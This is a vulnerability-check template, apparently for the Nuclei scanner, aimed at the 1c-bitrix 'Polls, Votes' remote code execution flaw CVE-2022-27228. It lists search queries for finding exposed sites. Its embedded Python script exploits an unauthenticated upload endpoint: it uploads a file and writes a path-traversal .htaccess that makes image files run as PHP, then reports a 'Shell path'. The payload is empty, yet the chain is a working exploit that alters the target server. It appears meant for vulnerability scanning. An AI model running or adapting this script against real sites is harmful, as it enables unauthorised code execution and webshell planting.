id: CVE-2022-27228-activecheck

info:
  name: 1c-bitrix vote module - Remote Code Execution
  author: letsIG0rAWAY
  severity: critical
  description: |
    In the vote (aka "Polls, Votes") module before 21.0.100 of Bitrix Site Manager, a remote unauthenticated attacker can execute arbitrary code.
  remediation: |
    Update the "Polls, Votes" (vote) module to 21.0.100 version.
  reference:
    - https://helpdesk.bitrix24.com/open/15536776/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-27228
    cwe-id: CWE-20
    epss-score: 0.0059
    epss-percentile: 0.75802
    cpe: cpe:2.3:a:1c-bitrix:1c-bitrix:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: 1c-bitrix
    product: 1c-bitrix
    accuracy: 0.95
    damage: 0.3
    shodan-query: html:"/bitrix/"
    rooster-query: |
      product.name:"1c-bitrix"
    fofa-query: app="Bitrix24-Site-Manager"
    netlas-query: tag.name:"1c_bitrix"
    censys-query: labels:"1c-bitrix"
    hunter-query: product.name="*Bitrix*"
    date: 16.01.2024
    code_requirements: python3(requests,urllib3)
    template_type: activecheck
    nuclei_commandline: -code
  tags: cve,cve2022,rce,1c-bitrix,vote

code:
  - engine:
      - python3
    source: |
      import requests
      import os
      import io
      import json
      import random
      import urllib.parse
      import pathlib
      import urllib3

      urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

      def get_bitrix_sessid(sess, url, kwargs):
          r = sess.get(f"{url}/bitrix/tools/composite_data.php", **kwargs, timeout=5)
          data = json.loads(r.text.replace("'", '"'))
          return data["bitrix_sessid"]


      def make_file(name, content):
          f = io.BytesIO(content)
          f.name = name
          return f


      def upload_files(sess, url, sessid, payloads, kwargs):
          cid = "CID" + str(random.randint(1000000000000, 9999999999999))
          pindex = "pIndex" + str(random.randint(1000000000000, 9999999999999))

          files = {
              "bxu_info[CID]": (None, cid),
              "bxu_info[packageIndex]": (None, pindex),
              "bxu_info[filesCount]": (None, str(len(payloads))),
              "bxu_info[mode]": (None, "upload"),
          }

          params = {
              "attachId[MODULE_ID]": "iblock",
              "attachId[ENTITY_TYPE]": "CFileUploader",
              "action": "vote",
              "sessid": sessid,
          }

          for i, f in enumerate(payloads):
              files[f"bxu_files[{i}][name]"] = (None, "1")
              files[f"bxu_files[{i}][{f.name}]"] = f
              params[f"attachId[ENTITY_ID][copies][{f.name}]"] = "1"

          r = sess.post(
              f"{url}/bitrix/tools/vote/uf.php",
              params=params,
              files=files,
              **kwargs
          )

          paths = {}

          try:
              data = r.json()
              for fname, info in data["files"][0]["file"]["files"].items():
                  if fname == "default":
                      continue
                  paths[fname] = info["tmp_name"]
          except Exception:
              raise Exception(f"Fail to upload files, bad response")

          return paths


      def mode_upload(sess, url, sessid, payload, payload_name, kwargs):
          ext = pathlib.Path(payload_name).suffix

          paths = upload_files(
              sess,
              url,
              sessid,
              [
                  make_file(payload_name, bytes("",'UTF-8')),
                  make_file(
                      "../.htaccess", f"AddHandler application/x-httpd-php {ext}\n".encode()
                  ),
              ],
              kwargs,
          )

          return paths[payload_name]

      def iwanttofinishwithbitrix(checkurl):
          try:
              if checkurl:
                  url = urllib.parse.urlparse(checkurl)

                  kwargs = {
                      "proxies": {
                          "http": "",
                          "https": "",
                      },
                      "headers": {
                          "User-Agent": "Mozilla/5.0 (compatible; CyberOKInspect/1.0; +https://www.cyberok.ru/policy.html)",
                          "Accept": "*/*",
                          "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
                          "Accept-Encoding": "gzip, deflate",
                          "Bx-ajax": "true",
                          "Origin": url.netloc,
                      },
                      "verify": False,
                  }
              
                  sess = requests.Session()

                  try:
                      print("[*] getting sessid")
                      bitrix_sessid = get_bitrix_sessid(sess, checkurl, kwargs)
                      print(f"[*] sessid = {bitrix_sessid}")
                  except requests.exceptions.ConnectionError:
                      print(f"[!] fail to connect to {checkurl}")

                  try:
                      print("[*] mode upload")
                      path = mode_upload(
                          sess,
                          checkurl,
                          bitrix_sessid,
                          "",
                          "fixcve-2022-27228.jpg",
                          kwargs,
                      )
                      parts = path.split("/")
                      shell_path = "/".join(parts[parts.index("upload") :])
                      print(f"[*] success! Shell path {checkurl}/{shell_path}")
                  except Exception as e:
                      print(f"[!] error: {str(e)}")
          except:
              pass

      iwanttofinishwithbitrix(os.getenv('BaseURL'))
    
    matchers:
      - type: word
        name: CVE-2022-27228
        words:
          - "success!"
